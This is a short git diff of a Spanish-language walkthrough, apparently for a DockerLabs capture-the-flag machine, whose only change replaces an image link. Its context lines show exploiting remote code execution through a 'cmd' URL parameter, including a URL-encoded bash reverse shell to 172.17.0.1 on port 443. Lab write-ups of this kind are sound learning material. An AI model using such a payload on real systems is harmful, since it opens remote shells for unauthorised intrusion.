@@ -93,7 +93,8 @@ nos dará un código que lo copiamos
 ![image](https://github.com/user-attachments/assets/4759141d-7a61-4ab1-8159-6bf156d6cb2d)
 
 y colocamos el buscador así:  172.17.0.2/?cmd=ls -la&page= y aquí colocamos el código que nos dio  que es vulnerable a ejecución de código remoto (RCE)
-![[dockerlabs/dificil/queuemedic/codigo3.png]]
+
+![image](https://github.com/user-attachments/assets/1882fd64-397c-4ea4-ad7a-96a8856ac272)
 
 ahora la URL debe quedar así:  172.17.0.2/?cmd=bash -c 'bash -i >%26/dev/tcp/172.17.0.1/443 0>%261'&page= y aquí colocamos el código que nos dio
 
